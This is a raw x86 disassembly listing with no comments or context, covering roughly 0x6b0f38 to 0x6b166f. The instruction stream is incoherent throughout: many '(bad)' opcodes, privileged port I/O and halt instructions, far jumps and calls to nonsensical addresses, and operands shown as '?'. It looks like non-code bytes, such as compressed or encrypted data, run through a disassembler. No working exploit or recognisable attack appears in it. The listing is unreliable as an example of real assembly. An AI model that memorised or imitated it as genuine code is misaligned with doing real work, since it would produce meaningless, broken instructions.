  6b0f38:	shr    DWORD PTR [esi-0x7e],1
  6b0f3b:	icebp  
  6b0f3c:	push   0xfffffff5
  6b0f3e:	out    dx,al
  6b0f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b0f40:	sub    eax,0x5642c895
  6b0f45:	rcl    BYTE PTR [eax],cl
  6b0f47:	outs   dx,DWORD PTR ds:[esi]
  6b0f48:	fadd   st(3),st
  6b0f4a:	jmp    0x228431cc
  6b0f4f:	fsubr  QWORD PTR [ebp+0x13]
  6b0f52:	int3   
  6b0f53:	shr    eax,0x97
  6b0f56:	into   
  6b0f57:	and    dh,al
  6b0f59:	cmp    dl,BYTE PTR [edx]
  6b0f5b:	sbb    BYTE PTR [ecx+esi*2-0x4d],bl
  6b0f5f:	(bad)  
  6b0f60:	push   esp
  6b0f61:	(bad)  
  6b0f62:	stc    
  6b0f63:	aad    0xde
  6b0f65:	loope  0x6b0fa1
  6b0f67:	dec    esp
  6b0f68:	test   DWORD PTR [ebp+0x6c],eax
  6b0f6b:	imul   eax,edx,0xb62e1b0
  6b0f71:	addr16 pushf 
  6b0f73:	int    0xca
  6b0f75:	cli    
  6b0f76:	dec    ebp
  6b0f77:	stc    
  6b0f78:	dec    ebp
  6b0f79:	or     bh,al
  6b0f7b:	test   BYTE PTR [esi-0x78057761],ch
  6b0f81:	sbb    eax,0x97570a5a
  6b0f86:	pop    eax
  6b0f87:	and    eax,DWORD PTR ds:0x7bd8bdd0
  6b0f8d:	and    bl,BYTE PTR [esi]
  6b0f8f:	cmp    al,0x56
  6b0f91:	and    eax,0xc0109c9
  6b0f96:	in     al,dx
  6b0f97:	adc    eax,0x73dd6499
  6b0f9c:	inc    ebp
  6b0f9d:	aam    0xb6
  6b0f9f:	jecxz  0x6b0f39
  6b0fa1:	xor    eax,ebp
  6b0fa3:	shl    DWORD PTR [ecx+0x5ef90f51],cl
  6b0fa9:	mov    dl,0x1a
  6b0fab:	sbb    eax,0x55a3343
  6b0fb0:	and    dl,dl
  6b0fb2:	jb     0x6b1019
  6b0fb4:	push   ss
  6b0fb5:	rol    BYTE PTR [edx],cl
  6b0fb7:	adc    eax,0x24ccfdf7
  6b0fbc:	cmp    edx,DWORD PTR [ecx-0x8]
  6b0fbf:	and    al,0xb8
  6b0fc1:	xor    bl,BYTE PTR [edx]
  6b0fc3:	mov    esp,0xf39b1bf0
  6b0fc8:	and    eax,0x840c2768
  6b0fcd:	jnp    0x6b0f58
  6b0fcf:	cmc    
  6b0fd0:	sub    dl,BYTE PTR ds:0x3e3974a4
  6b0fd6:	pop    ss
  6b0fd7:	mov    edi,0x404fbd33
  6b0fdc:	inc    esi
  6b0fdd:	inc    ecx
  6b0fde:	and    DWORD PTR [edx-0x7a32abb0],0x33ba3ef6
  6b0fe8:	sbb    BYTE PTR [ebp-0x332818f],cl
  6b0fee:	(bad)  
  6b0fef:	jg     0x6b1011
  6b0ff1:	mov    bl,0x27
  6b0ff3:	dec    eax
  6b0ff4:	int    0x6a
  6b0ff6:	in     eax,dx
  6b0ff7:	and    BYTE PTR [eax+0x77],ah
  6b0ffa:	jmp    0x18db:0xdd7e3dd0
  6b1001:	xchg   edi,eax
  6b1002:	push   es
  6b1003:	add    DWORD PTR [ecx],edx
  6b1005:	mov    ecx,0x82cd60e2
  6b100a:	daa    
  6b100b:	inc    edx
  6b100c:	sub    BYTE PTR [edx-0x254df0ea],al
  6b1012:	pop    ss
  6b1013:	into   
  6b1014:	les    esi,FWORD PTR [ebp-0x2740912f]
  6b101a:	mov    ecx,0xcb36cdab
  6b101f:	into   
  6b1020:	xchg   BYTE PTR [esi],ch
  6b1022:	mov    WORD PTR [eax+0x5dda86ce],cs
  6b1028:	cmpxchg BYTE PTR [edi],dh
  6b102b:	ss dec ecx
  6b102d:	imul   ebx,DWORD PTR [eax],0xffffffa9
  6b1030:	mov    es,esp
  6b1032:	xor    ebx,ebx
  6b1034:	pop    edx
  6b1035:	not    DWORD PTR [esi+0x8]
  6b1038:	sbb    ecx,DWORD PTR [ebp-0x7bba21c3]
  6b103e:	cmp    DWORD PTR [ebx+0xfa5bf8e],ecx
  6b1044:	xchg   BYTE PTR [ebx-0x5dddc252],bh
  6b104a:	ret    0xcc7d
  6b104d:	and    eax,0x7cc4bc12
  6b1052:	lds    eax,FWORD PTR [edi+0x654bdd54]
  6b1058:	sub    DWORD PTR [esi*8+0x54a8525c],esi
  6b105f:	test   BYTE PTR [esi],bl
  6b1061:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  6b1063:	or     ebp,edi
  6b1065:	push   edi
  6b1066:	int3   
  6b1067:	inc    edi
  6b1068:	mov    eax,0x8faf64c7
  6b106d:	popa   
  6b106e:	fxtract 
  6b1070:	test   DWORD PTR [ecx+0x36],eax
  6b1073:	pop    eax
  6b1074:	adc    edi,edx
  6b1076:	(bad)  
  6b1077:	in     al,dx
  6b1078:	add    ebp,DWORD PTR [ebp+eax*4+0x478cf3d6]
  6b107f:	in     al,0x34
  6b1081:	sbb    BYTE PTR [edx],cl
  6b1083:	add    BYTE PTR ds:0x3d1bcfef,dh
  6b1089:	das    
  6b108a:	rol    BYTE PTR [eax+edx*2-0x69],cl
  6b108e:	lock pop ds
  6b1090:	stc    
  6b1091:	push   0xc0c6a300
  6b1096:	sbb    al,0xa8
  6b1098:	jecxz  0x6b109e
  6b109a:	adc    DWORD PTR [eax-0x18],eax
  6b109d:	mov    al,0xb5
  6b109f:	mov    dh,0x62
  6b10a1:	std    
  6b10a2:	mov    ah,0xf9
  6b10a4:	lods   al,BYTE PTR ds:[esi]
  6b10a5:	sbb    ecx,DWORD PTR [eax+0x4e2a63a2]
  6b10ab:	push   ecx
  6b10ac:	sar    DWORD PTR [edi+eax*8+0x6d94d4ab],0x3f
  6b10b4:	lea    ebp,[ecx+0x28]
  6b10b7:	sub    DWORD PTR [eax-0x18],ebx
  6b10ba:	iret   
  6b10bb:	test   ebx,edx
  6b10bd:	les    edi,FWORD PTR [eax+0x45]
  6b10c0:	inc    ebp
  6b10c1:	(bad)  
  6b10c2:	or     ch,BYTE PTR [ebx+0x338506b9]
  6b10c8:	lock and DWORD PTR [ecx],0x57f8c1a8
  6b10cf:	add    BYTE PTR [eax-0x42],dl
  6b10d2:	mov    edx,0xc55965eb
  6b10d7:	ins    DWORD PTR es:[edi],dx
  6b10d8:	sbb    al,0x63
  6b10da:	xchg   esi,eax
  6b10db:	mov    edx,0x20e7d881
  6b10e0:	dec    ecx
  6b10e1:	aas    
  6b10e2:	inc    esi
  6b10e3:	sbb    BYTE PTR [edi],cl
  6b10e5:	mov    edx,0xfc3241bd
  6b10ea:	clc    
  6b10eb:	xchg   esi,eax
  6b10ec:	imul   edi
  6b10ee:	aaa    
  6b10ef:	add    BYTE PTR [edx+eiz*4-0x66cf0848],al
  6b10f6:	(bad)  
  6b10f7:	loopne 0x6b10b3
  6b10f9:	inc    ebx
  6b10fa:	ins    DWORD PTR es:[edi],dx
  6b10fb:	pusha  
  6b10fc:	ds call 0x988318e9
  6b1102:	cli    
  6b1103:	clc    
  6b1104:	in     al,dx
  6b1105:	inc    esi
  6b1106:	mov    ch,BYTE PTR [ebx+0x79e39a1]
  6b110c:	int3   
  6b110d:	and    ch,bh
  6b110f:	xchg   ecx,eax
  6b1110:	xor    BYTE PTR [ebp-0x6ce9fd7d],dh
  6b1116:	ss out 0x0,eax
  6b1119:	cdq    
  6b111a:	and    al,0x2a
  6b111c:	inc    edi
  6b111d:	adc    BYTE PTR [eax-0x1b988f79],dh
  6b1123:	ret    
  6b1124:	push   edx
  6b1125:	add    DWORD PTR ds:0xdf46c84b,eax
  6b112b:	cmp    eax,0x790a825c
  6b1130:	(bad)  
  6b1131:	aad    0xe6
  6b1133:	push   esi
  6b1134:	fdivr  DWORD PTR [edi]
  6b1136:	hlt    
  6b1137:	call   0xbd04:0x6eddae39
  6b113e:	xlat   BYTE PTR ds:[ebx]
  6b113f:	push   eax
  6b1140:	add    ecx,DWORD PTR [edx]
  6b1142:	jle    0x6b1172
  6b1144:	shl    BYTE PTR [edx-0x7577276f],0x25
  6b114b:	jae    0x6b116f
  6b114d:	mov    BYTE PTR [ecx],al
  6b114f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b1150:	push   edi
  6b1151:	dec    edx
  6b1152:	and    DWORD PTR [ebx+0x50],edi
  6b1155:	mov    eax,ds:0x7169d8f0
  6b115a:	aaa    
  6b115b:	and    DWORD PTR [ebp-0x6b919858],edi
  6b1161:	sbb    BYTE PTR [eax-0x5269d72d],bl
  6b1167:	in     eax,0x8
  6b1169:	loop   0x6b117d
  6b116b:	fcomp  st(3)
  6b116d:	cld    
  6b116e:	ds nop
  6b1170:	out    0x85,al
  6b1172:	(bad)  
  6b1173:	jl     0x6b116c
  6b1175:	push   edi
  6b1176:	arpl   WORD PTR [ecx+edi*8-0x60aedf3f],ax
  6b117d:	sub    eax,esi
  6b117f:	pop    DWORD PTR [edx-0x35]
  6b1182:	lea    edx,[ebx]
  6b1184:	and    ebx,eax
  6b1186:	into   
  6b1187:	std    
  6b1188:	xchg   edx,eax
  6b1189:	xchg   edi,eax
  6b118a:	mov    edi,0xea3675af
  6b118f:	rcl    DWORD PTR [esi+0x56c77549],cl
  6b1195:	jle    0x6b1131
  6b1197:	cs xchg ebx,eax
  6b1199:	mov    edx,0x7b7e4a38
  6b119e:	xor    DWORD PTR [ebx+ebp*2-0x5d],esi
  6b11a2:	pop    ebp
  6b11a3:	pop    esp
  6b11a4:	sbb    DWORD PTR [ebp-0x5],edx
  6b11a7:	enter  0x450b,0x5
  6b11ab:	outs   dx,BYTE PTR ds:[esi]
  6b11ac:	aad    0xb7
  6b11ae:	push   es
  6b11af:	jno    0x6b11b0
  6b11b1:	shl    BYTE PTR [esi+eiz*1+0x622a3fda],0x85
  6b11b9:	enter  0x324,0xc2
  6b11bd:	and    BYTE PTR [ebx+0x1be43b8d],al
  6b11c3:	adc    bl,BYTE PTR [edx]
  6b11c5:	int    0x6b
  6b11c7:	mov    bh,0xdb
  6b11c9:	jbe    0x6b1225
  6b11cb:	push   0xffffffdb
  6b11cd:	jmp    0x6b1219
  6b11cf:	dec    esp
  6b11d0:	sbb    al,0xd8
  6b11d2:	cmp    dh,bh
  6b11d4:	sahf   
  6b11d5:	sbb    BYTE PTR [ecx+0x71bc597c],bl
  6b11db:	shl    DWORD PTR [ebx-0x32],1
  6b11de:	xor    ebp,DWORD PTR [ecx-0x4a]
  6b11e1:	js     0x6b125b
  6b11e3:	stos   DWORD PTR es:[edi],eax
  6b11e4:	stc    
  6b11e5:	mov    bl,0x43
  6b11e7:	fdivr  QWORD PTR [edx]
  6b11e9:	int3   
  6b11ea:	mov    al,ds:0xdb0d952e
  6b11ef:	jmp    0x6b11df
  6b11f1:	or     al,0x37
  6b11f3:	push   cs
  6b11f4:	mov    ebp,gs
  6b11f6:	outs   dx,BYTE PTR ds:[esi]
  6b11f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b11f8:	pop    esp
  6b11f9:	jno    0x6b1279
  6b11fb:	xor    eax,0xcd2f2be8
  6b1200:	cwde   
  6b1201:	das    
  6b1202:	and    al,0xa0
  6b1204:	sub    al,0xaf
  6b1206:	ja     0x6b11a8
  6b1208:	(bad)  
  6b1209:	icebp  
  6b120a:	cs push eax
  6b120c:	pop    ds
  6b120d:	push   0x5e
  6b120f:	pop    edx
  6b1210:	pop    eax
  6b1211:	dec    ecx
  6b1212:	add    dl,BYTE PTR [ecx-0x766e57d3]
  6b1218:	push   0x14
  6b121a:	mov    bl,0x4d
  6b121c:	xor    al,0xb9
  6b121e:	push   esi
  6b121f:	jge    0x6b1208
  6b1221:	sti    
  6b1222:	push   ebx
  6b1223:	mov    bl,0xbc
  6b1225:	(bad)  
  6b1226:	pop    eax
  6b1227:	and    eax,0xb583e5a3
  6b122c:	imul   esi,DWORD PTR [eax],0xffffffe4
  6b122f:	fistp  DWORD PTR [ebp-0xb1e3dc0]
  6b1235:	or     al,0x25
  6b1237:	sar    DWORD PTR [eax+0x138c86ff],0x87
  6b123e:	aam    0x47
  6b1240:	or     dl,BYTE PTR [esi]
  6b1242:	mov    esp,0xc12e26be
  6b1247:	sbb    edi,DWORD PTR [eax+0x439fd756]
  6b124d:	fwait
  6b124e:	and    al,0x10
  6b1250:	sbb    eax,0xf61b4d0b
  6b1255:	pop    esi
  6b1256:	cli    
  6b1257:	mov    esi,0xff717a18
  6b125c:	stos   DWORD PTR es:[edi],eax
  6b125d:	mov    ch,0x1d
  6b125f:	adc    bl,ah
  6b1261:	sti    
  6b1262:	ret    
  6b1263:	fld    DWORD PTR [esi+0x764bb394]
  6b1269:	out    dx,eax
  6b126a:	and    bh,BYTE PTR [eax-0x27]
  6b126d:	and    al,0x60
  6b126f:	mov    ds:0xc902c15a,al
  6b1274:	gs pusha 
  6b1276:	les    ecx,FWORD PTR [ebp-0x7d]
  6b1279:	pop    edx
  6b127a:	jae    0x6b127c
  6b127c:	es xor eax,0x9e852473
  6b1282:	pop    ebx
  6b1283:	test   eax,0x2e6a7d87
  6b1288:	out    dx,al
  6b1289:	dec    ebx
  6b128a:	push   eax
  6b128b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b128c:	mov    BYTE PTR [ebx+0x59c7cf0c],bh
  6b1292:	cmp    al,0xc3
  6b1294:	xchg   ecx,eax
  6b1295:	pushf  
  6b1296:	push   ds
  6b1297:	in     al,dx
  6b1298:	jno    0x6b1306
  6b129a:	hlt    
  6b129b:	sub    BYTE PTR [eax+0xcb083ba],dl
  6b12a1:	test   BYTE PTR [esi],bh
  6b12a3:	cli    
  6b12a4:	call   0x61a0eb08
  6b12a9:	inc    ecx
  6b12aa:	jp     0x6b1305
  6b12ac:	mov    ch,0x77
  6b12ae:	in     eax,dx
  6b12af:	into   
  6b12b0:	out    dx,al
  6b12b1:	xchg   ecx,eax
  6b12b2:	test   DWORD PTR ss:[ecx-0x7ebf7d6d],0x24013f6f
  6b12bd:	push   ss
  6b12be:	retf   
  6b12bf:	lock inc eax
  6b12c1:	ret    
  6b12c2:	cmp    DWORD PTR [ebx+0x46236e3d],ecx
  6b12c8:	cmp    edx,DWORD PTR [ebx-0x6d7cbd69]
  6b12ce:	lahf   
  6b12cf:	aas    
  6b12d0:	retf   
  6b12d1:	in     al,0x8c
  6b12d3:	and    eax,0x9e0b9583
  6b12d8:	mov    ebp,0x56ba0861
  6b12dd:	sbb    DWORD PTR ds:0x3cfe4d2f,edx
  6b12e3:	shl    DWORD PTR [ebp-0x22],1
  6b12e6:	mov    bl,0xff
  6b12e8:	stos   BYTE PTR es:[edi],al
  6b12e9:	pop    esp
  6b12ea:	jmp    0x24c73fea
  6b12ef:	cmp    DWORD PTR ds:0x7eee0f38,ecx
  6b12f5:	push   esi
  6b12f6:	call   DWORD PTR [ebp+0x23df5f]
  6b12fc:	dec    edx
  6b12fd:	imul   ecx,edx,0x67d4cec0
  6b1303:	push   ecx
  6b1304:	fisttp QWORD PTR [esi+ecx*1-0x35f18931]
  6b130b:	je     0x6b137e
  6b130d:	pop    edx
  6b130e:	cmp    DWORD PTR [eax-0x34],ebx
  6b1311:	jecxz  0x6b1312
  6b1313:	vpavgw xmm0,xmm7,XMMWORD PTR [edx+0x366fc4e3]
  6b131b:	jle    0x6b1324
  6b131d:	add    cl,BYTE PTR ds:[ebp+0xfff21cc]
  6b1324:	lock std 
  6b1326:	xor    bl,dh
  6b1328:	daa    
  6b1329:	lds    edx,FWORD PTR [edi]
  6b132b:	pop    edx
  6b132c:	std    
  6b132d:	mov    bl,0x13
  6b132f:	inc    ebp
  6b1330:	jecxz  0x6b12f3
  6b1332:	loop   0x6b130e
  6b1334:	jno    0x6b1359
  6b1336:	jae    0x6b12fc
  6b1338:	adc    edx,DWORD PTR [eax+0x11ca5d70]
  6b133e:	outs   dx,DWORD PTR cs:[esi]
  6b1340:	cld    
  6b1341:	out    0xd3,al
  6b1343:	sbb    eax,edx
  6b1345:	cmp    esp,DWORD PTR [ebx+0x20599a8e]
  6b134b:	pop    ss
  6b134c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b134d:	jp     0x6b1335
  6b134f:	and    BYTE PTR [ebp+0x6a],dl
  6b1352:	cld    
  6b1353:	sbb    eax,DWORD PTR [edi-0x47]
  6b1356:	stc    
  6b1357:	lods   eax,DWORD PTR ds:[esi]
  6b1358:	nop
  6b1359:	ja     0x6b1360
  6b135b:	ds pop ebx
  6b135d:	stos   BYTE PTR es:[edi],al
  6b135e:	in     eax,0xd0
  6b1360:	dec    edx
  6b1361:	mov    bh,0x8a
  6b1363:	bound  eax,QWORD PTR [esi+0x4581c290]
  6b1369:	xor    al,0xbd
  6b136b:	pop    ds
  6b136c:	pop    edx
  6b136d:	cmp    DWORD PTR [edx],esp
  6b136f:	pop    ebp
  6b1370:	sar    BYTE PTR [edx],cl
  6b1372:	pop    es
  6b1373:	and    ch,ch
  6b1375:	lds    ecx,FWORD PTR [ecx-0x25862232]
  6b137b:	sahf   
  6b137c:	mov    WORD PTR [edi],?
  6b137e:	in     eax,0xcb
  6b1380:	shl    ecx,0xc1
  6b1383:	xor    edi,ecx
  6b1385:	mov    DWORD PTR [eax],ebp
  6b1387:	loop   0x6b13b3
  6b1389:	imul   esp,esi,0x5895c6a5
  6b138f:	aas    
  6b1390:	jmp    0x9f3d:0xc46af113
  6b1397:	jbe    0x693d433f
  6b139d:	shr    BYTE PTR [edx],cl
  6b139f:	and    BYTE PTR ds:0xccedd6d3,bh
  6b13a5:	jnp    0x6b13b6
  6b13a7:	pop    ecx
  6b13a8:	js     0x6b1405
  6b13aa:	aaa    
  6b13ab:	das    
  6b13ac:	push   ecx
  6b13ad:	mov    esp,0x43e783e5
  6b13b2:	mov    al,0x63
  6b13b4:	xchg   ebp,eax
  6b13b5:	inc    esp
  6b13b6:	outs   dx,DWORD PTR ds:[esi]
  6b13b7:	mov    ds:0x53734d75,al
  6b13bc:	clc    
  6b13bd:	mov    esp,DWORD PTR [ecx+0x78069897]
  6b13c3:	ret    
  6b13c4:	cmp    al,0x5a
  6b13c7:	jge    0x6b13d8
  6b13c9:	cmp    BYTE PTR [ecx],ch
  6b13cb:	stc    
  6b13cc:	fsubr  st,st(7)
  6b13ce:	push   cs
  6b13cf:	inc    ebp
  6b13d0:	scas   al,BYTE PTR es:[edi]
  6b13d1:	aam    0xba
  6b13d3:	inc    eax
  6b13d4:	imul   esi,ebp,0xffffff8a
  6b13d7:	in     al,0xcb
  6b13d9:	pop    eax
  6b13da:	mov    ebx,0xd6d69538
  6b13df:	add    al,BYTE PTR [eax-0x49b48db]
  6b13e5:	xor    al,0xc1
  6b13e7:	and    BYTE PTR ss:[edi+esi*8+0x5e],0x20
  6b13ed:	adc    esp,DWORD PTR [ebx+esi*8-0x3a]
  6b13f1:	mov    BYTE PTR [ebx+esi*4],cl
  6b13f4:	cmc    
  6b13f5:	retf   
  6b13f6:	cdq    
  6b13f7:	loopne 0x6b13bc
  6b13f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b13fa:	jne    0x6b137e
  6b13fc:	fisub  DWORD PTR [edi+0x6d757667]
  6b1402:	cmp    cl,BYTE PTR [eax+edi*8-0x7be3113a]
  6b1409:	fsubr  st(4),st
  6b140b:	add    BYTE PTR [eax-0x67e18081],dh
  6b1411:	gs pop ds
  6b1413:	push   ss
  6b1414:	imul   BYTE PTR [ebx]
  6b1416:	ds scas al,BYTE PTR es:[edi]
  6b1418:	push   esp
  6b1419:	inc    edi
  6b141a:	xchg   ebp,eax
  6b141b:	pop    es
  6b141c:	push   ecx
  6b141d:	cdq    
  6b141e:	stc    
  6b141f:	or     eax,0xbce4c077
  6b1424:	das    
  6b1425:	int3   
  6b1426:	dec    ebp
  6b1427:	hlt    
  6b1428:	fisub  DWORD PTR [eax+0xe]
  6b142b:	nop
  6b142c:	cmp    DWORD PTR [eax],ebp
  6b142e:	scas   al,BYTE PTR es:[edi]
  6b142f:	gs and eax,0xe3447278
  6b1435:	pop    es
  6b1436:	xlat   BYTE PTR ds:[ebx]
  6b1437:	and    DWORD PTR [edi],ebx
  6b1439:	outs   dx,DWORD PTR ds:[esi]
  6b143a:	xor    DWORD PTR [ebx+ebp*8],eax
  6b143d:	lods   eax,DWORD PTR ds:[esi]
  6b143e:	ss jb  0x6b1417
  6b1441:	retf   0xd8b4
  6b1444:	bnd ret 
  6b1446:	ins    DWORD PTR es:[edi],dx
  6b1447:	fwait
  6b1448:	pusha  
  6b1449:	shl    BYTE PTR [eax],0xec
  6b144c:	shr    DWORD PTR [edi+0x8],1
  6b144f:	xchg   BYTE PTR [edx+0x30],bl
  6b1452:	inc    ebx
  6b1453:	sub    ch,al
  6b1455:	xchg   edi,eax
  6b1456:	xchg   esi,eax
  6b1457:	repz push cs
  6b1459:	or     BYTE PTR [ebx],ah
  6b145b:	into   
  6b145c:	jne    0x6b14b3
  6b145e:	dec    esi
  6b145f:	and    al,0xae
  6b1461:	outs   dx,DWORD PTR ds:[esi]
  6b1462:	sahf   
  6b1463:	fwait
  6b1464:	sbb    edx,ebp
  6b1466:	or     al,0xe6
  6b1468:	mov    esp,0x49b7139e
  6b146d:	fstp   QWORD PTR [ecx+eax*2+0xbbb9d3c]
  6b1474:	ret    0xf413
  6b1477:	into   
  6b1478:	and    edx,edi
  6b147a:	mov    DWORD PTR ds:0x2239225a,esi
  6b1480:	sbb    ecx,DWORD PTR [esi+0x50f0ddd]
  6b1486:	inc    edi
  6b1487:	sbb    al,0xf8
  6b1489:	mov    dl,0x46
  6b148b:	push   ecx
  6b148c:	mov    ebx,0xdebde08
  6b1491:	push   ebx
  6b1492:	aad    0xac
  6b1494:	xchg   ebp,eax
  6b1495:	jle    0x6b1494
  6b1497:	into   
  6b1498:	hlt    
  6b1499:	xchg   BYTE PTR [edx],cl
  6b149b:	and    BYTE PTR [esp+ebp*8+0x28],dl
  6b149f:	sbb    ecx,esp
  6b14a1:	fist   DWORD PTR [esi+0x62]
  6b14a4:	push   ebx
  6b14a5:	adc    dh,0xd8
  6b14a8:	rcl    BYTE PTR [eax-0x3a],cl
  6b14ab:	lods   al,BYTE PTR ds:[esi]
  6b14ac:	sub    al,0xbf
  6b14ae:	push   ss
  6b14af:	add    ecx,DWORD PTR ds:0x5037d92
  6b14b5:	mov    bl,0x64
  6b14b7:	xor    edi,ecx
  6b14b9:	std    
  6b14ba:	mov    al,0x44
  6b14bc:	ficomp WORD PTR [ecx]
  6b14be:	scas   eax,DWORD PTR es:[di]
  6b14c0:	(bad)  
  6b14c1:	(bad)  
  6b14c2:	repz mov eax,ds:0x14b07919
  6b14c8:	clc    
  6b14c9:	xor    ch,BYTE PTR [esp+edx*8]
  6b14cc:	xor    al,0x37
  6b14ce:	into   
  6b14cf:	cli    
  6b14d0:	pop    es
  6b14d1:	xlat   BYTE PTR ds:[ebx]
  6b14d2:	or     DWORD PTR [eax],0xb160483e
  6b14d8:	in     al,0x90
  6b14da:	adc    esp,ebx
  6b14dc:	inc    edi
  6b14dd:	les    esp,FWORD PTR [ebp+0x54d972fd]
  6b14e3:	xchg   esi,eax
  6b14e4:	test   DWORD PTR [ebx+eax*2],edi
  6b14e7:	push   cs
  6b14e8:	cmp    DWORD PTR fs:[ecx+0x368129bd],ebp
  6b14ef:	in     al,dx
  6b14f0:	lahf   
  6b14f1:	jle    0x6b154f
  6b14f3:	sub    ah,dh
  6b14f5:	xor    DWORD PTR gs:[ebp+eiz*2-0x71fc46bd],ebx
  6b14fd:	lock xchg edx,eax
  6b14ff:	aad    0x6a
  6b1501:	mov    dl,0xd9
  6b1503:	mov    dl,0x37
  6b1505:	mov    ah,0x44
  6b1507:	in     al,dx
  6b1508:	cdq    
  6b1509:	or     al,0x21
  6b150b:	imul   esp,DWORD PTR [esi],0xffffffa8
  6b150e:	sbb    dh,BYTE PTR [edx*4+0x1388ad27]
  6b1515:	lock mov ah,0x69
  6b1518:	test   DWORD PTR [edi+0x2d],ebx
  6b151b:	add    ebp,DWORD PTR [edx+ebp*2]
  6b151e:	bound  esi,QWORD PTR [ebx+ebp*2]
  6b1521:	sub    al,0xa6
  6b1523:	adc    al,0x1b
  6b1525:	dec    ebp
  6b1526:	popa   
  6b1527:	aad    0x8f
  6b1529:	je     0x6b1583
  6b152b:	jl     0x6b14c2
  6b152d:	imul   edx,ecx,0xffffffa4
  6b1530:	retf   0xc640
  6b1533:	lods   al,BYTE PTR ds:[esi]
  6b1534:	push   ss
  6b1535:	sar    edi,0xff
  6b1538:	inc    esp
  6b1539:	pop    ebx
  6b153a:	sub    eax,0xc9b4432a
  6b153f:	jb     0x6b1565
  6b1541:	inc    edi
  6b1542:	imul   ebx,eax,0xb191da53
  6b1548:	mov    ds:0x9e3af5ee,al
  6b154d:	push   ebx
  6b154e:	scas   eax,DWORD PTR es:[edi]
  6b154f:	imul   ebx,edi,0x4f8e4d41
  6b1555:	mov    ecx,0x98fe9090
  6b155a:	xor    al,0x5b
  6b155c:	jmp    0x4b578d6
  6b1561:	std    
  6b1562:	pop    ebx
  6b1563:	jb     0x6b1500
  6b1565:	dec    ebp
  6b1566:	nop
  6b1567:	pop    edx
  6b1568:	in     al,0x5f
  6b156a:	fcomp  QWORD PTR ds:0xb4d36040
  6b1570:	and    esi,DWORD PTR [edi+0x5c]
  6b1573:	pop    ds
  6b1574:	add    al,0x81
  6b1576:	ret    
  6b1577:	push   ss
  6b1578:	fisubr WORD PTR [ecx-0x42]
  6b157b:	or     DWORD PTR gs:[esi+0x51ebc3c4],ecx
  6b1582:	std    
  6b1583:	loope  0x6b15a8
  6b1585:	add    DWORD PTR [ecx-0x22],ebp
  6b1588:	cli    
  6b1589:	loopne 0x6b1525
  6b158b:	mov    bl,0x82
  6b158d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b158e:	js     0x6b15f9
  6b1590:	mov    edx,0x7287703e
  6b1595:	fs xchg esi,eax
  6b1597:	test   al,0xea
  6b1599:	adc    eax,0x3f7fff48
  6b159e:	push   es
  6b159f:	mov    edx,0xdfe150a7
  6b15a4:	daa    
  6b15a5:	xor    eax,0x58102496
  6b15aa:	or     DWORD PTR [ecx-0x6e],edx
  6b15ad:	loop   0x6b15c5
  6b15af:	int3   
  6b15b0:	nop
  6b15b1:	mov    ebp,?
  6b15b3:	scas   al,BYTE PTR es:[edi]
  6b15b4:	add    DWORD PTR [eax-0x2db5f83e],ebx
  6b15ba:	or     edi,ebx
  6b15bc:	mov    edi,0x455758c
  6b15c1:	in     eax,0x75
  6b15c3:	out    0xd7,eax
  6b15c5:	(bad)  
  6b15c6:	lods   al,BYTE PTR ds:[esi]
  6b15c7:	cmp    al,0x67
  6b15c9:	lods   al,BYTE PTR ds:[esi]
  6b15ca:	enter  0xe8d5,0x8d
  6b15ce:	or     eax,0x77e8be01
  6b15d3:	mov    esp,0xefa78b03
  6b15d8:	ins    DWORD PTR es:[edi],dx
  6b15d9:	(bad)  
  6b15da:	std    
  6b15db:	mov    dh,0xc5
  6b15dd:	pop    ds
  6b15de:	jns    0x6b1561
  6b15e0:	out    dx,eax
  6b15e1:	(bad)  
  6b15e2:	loopne 0x6b15d0
  6b15e4:	in     eax,0x99
  6b15e6:	inc    ebp
  6b15e7:	outs   dx,BYTE PTR ds:[esi]
  6b15e8:	dec    edx
  6b15e9:	jp     0x6b159d
  6b15eb:	pop    esp
  6b15ec:	push   es
  6b15ed:	lds    esi,FWORD PTR [ebx-0x4b]
  6b15f0:	and    DWORD PTR [esi+0x33527732],ecx
  6b15f6:	std    
  6b15f7:	out    0x1d,eax
  6b15f9:	(bad)
  6b15fd:	(bad)  
  6b15fe:	cli    
  6b15ff:	aam    0xbb
  6b1601:	xchg   edi,eax
  6b1602:	pusha  
  6b1603:	mov    ebx,DWORD PTR [esi-0x50]
  6b1606:	add    DWORD PTR [eax-0x4d],ecx
  6b1609:	jb     0x6b160e
  6b160b:	dec    eax
  6b160c:	pop    edi
  6b160d:	dec    edi
  6b160e:	arpl   WORD PTR ds:0x6e941082,bp
  6b1614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1615:	pop    esi
  6b1616:	lds    ecx,FWORD PTR [edx+0x19]
  6b1619:	xchg   ecx,eax
  6b161a:	dec    esi
  6b161b:	out    0x70,al
  6b161d:	adc    DWORD PTR [edx-0x460b8038],ebx
  6b1623:	(bad)  
  6b1624:	and    al,0xcd
  6b1626:	mov    dh,0x1
  6b1628:	sbb    ecx,DWORD PTR [edx+0x1e5defce]
  6b162e:	iret   
  6b162f:	test   DWORD PTR [eax],edi
  6b1631:	fisubr WORD PTR [esi+0x21586254]
  6b1637:	imul   eax,ecx,0x16
  6b163a:	dec    ebx
  6b163b:	pop    esp
  6b163c:	sti    
  6b163d:	push   ebp
  6b163e:	in     al,0xe3
  6b1640:	adc    al,0xe9
  6b1642:	xchg   esp,eax
  6b1643:	das    
  6b1644:	ret    
  6b1645:	fwait
  6b1646:	je     0x6b16b2
  6b1648:	inc    ecx
  6b1649:	jmp    0x6b16be
  6b164b:	inc    edx
  6b164c:	mov    edi,0x2a2bdf2
  6b1651:	das    
  6b1652:	mov    WORD PTR [esi-0x5c],ds
  6b1655:	aaa    
  6b1656:	and    al,0x53
  6b1658:	jbe    0x6b1600
  6b165a:	in     al,dx
  6b165b:	sub    eax,0xd09ede64
  6b1660:	jp     0x6b161a
  6b1662:	iret   
  6b1663:	rcl    DWORD PTR [edi-0x51],1
  6b1666:	dec    ecx
  6b1667:	sub    bl,BYTE PTR [ecx+0x60]
  6b166a:	mov    ds:0x40b3b92d,al
  6b166f:	cdq    
